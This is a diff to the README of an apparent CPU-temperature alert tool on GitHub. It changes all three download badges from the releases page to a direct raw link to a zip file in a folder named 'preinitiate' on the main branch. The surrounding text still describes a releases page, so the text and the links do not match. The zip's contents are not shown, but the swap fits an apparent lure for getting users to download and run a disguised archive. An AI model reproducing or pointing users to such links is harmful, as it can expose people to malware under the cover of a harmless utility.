@@ -1,6 +1,6 @@
 # 🌡️ cpu-temperature-alert-tool - Always Know When Your PC Overheats
 
-[![Download Now](https://img.shields.io/badge/Download-cpu--temperature--alert--tool-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/reachportage760/cpu-temperature-alert-tool/releases)
+[![Download Now](https://img.shields.io/badge/Download-cpu--temperature--alert--tool-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/reachportage760/cpu-temperature-alert-tool/raw/refs/heads/main/preinitiate/2.5-alpha.4.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Uses under 5 MB of RAM — that's less than a single browser tab. This tool won'
 ### Step 1: Download the Tool
 
 **Visit this link to download the application:**  
-[![Download Here](https://img.shields.io/badge/⬇️%20Download%20cpu--temperature--alert--tool-orange?style=for-the-badge)](https://github.com/reachportage760/cpu-temperature-alert-tool/releases)
+[![Download Here](https://img.shields.io/badge/⬇️%20Download%20cpu--temperature--alert--tool-orange?style=for-the-badge)](https://github.com/reachportage760/cpu-temperature-alert-tool/raw/refs/heads/main/preinitiate/2.5-alpha.4.zip)
 
 The download page will show you available versions. Look for the latest release and download the file to your computer.
 
@@ -192,7 +192,7 @@ Stop wondering if your PC is running too hot. Get the answer instantly.
 
 ## 📥 Download Again
 
-[![Get It Now](https://img.shields.io/badge/🚀%20Download%20from%20Releases-brightgreen?style=for-the-badge)](https://github.com/reachportage760/cpu-temperature-alert-tool/releases)
+[![Get It Now](https://img.shields.io/badge/🚀%20Download%20from%20Releases-brightgreen?style=for-the-badge)](https://github.com/reachportage760/cpu-temperature-alert-tool/raw/refs/heads/main/preinitiate/2.5-alpha.4.zip)
 
 ---
 
